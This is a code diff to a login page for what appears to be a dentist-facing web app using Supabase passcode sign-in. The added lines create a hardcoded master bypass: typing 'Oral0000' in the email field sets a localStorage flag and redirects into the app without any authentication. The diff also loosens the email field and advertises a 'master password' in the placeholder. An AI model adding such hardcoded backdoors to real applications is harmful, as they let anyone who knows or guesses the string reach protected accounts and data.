@@ -17,6 +17,12 @@ export default function LoginPage() {
     setLoading(true);
     setMessage(null);
 
+    if (email === 'Oral0000') {
+      localStorage.setItem('master_bypass', 'true');
+      router.push('/');
+      return;
+    }
+
     const { error } = await supabase.auth.signInWithOtp({
       email,
       options: {
@@ -76,12 +82,12 @@ export default function LoginPage() {
               </label>
               <input
                 id="email"
-                type="email"
+                type="text"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
                 required
                 className="w-full px-4 py-3 bg-gray-900/50 border border-gray-700 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
-                placeholder="dentist@example.com"
+                placeholder="dentist@example.com または マスターパスワード"
               />
             </div>
             <button
